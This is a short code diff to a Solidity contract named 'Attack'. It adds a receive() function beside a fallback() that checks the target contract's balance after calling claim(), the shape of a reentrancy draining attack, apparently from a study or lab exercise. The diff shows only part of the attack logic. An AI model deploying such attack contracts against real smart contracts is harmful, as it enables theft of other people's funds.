@@ -24,6 +24,10 @@ contract Attack {
         da.claim();
     }
 
+    receive() external payable {
+        console.log("receive");
+    }
+
     fallback() external payable {
         console.log("-------receive-------");
         if (address(da).balance > 0) {
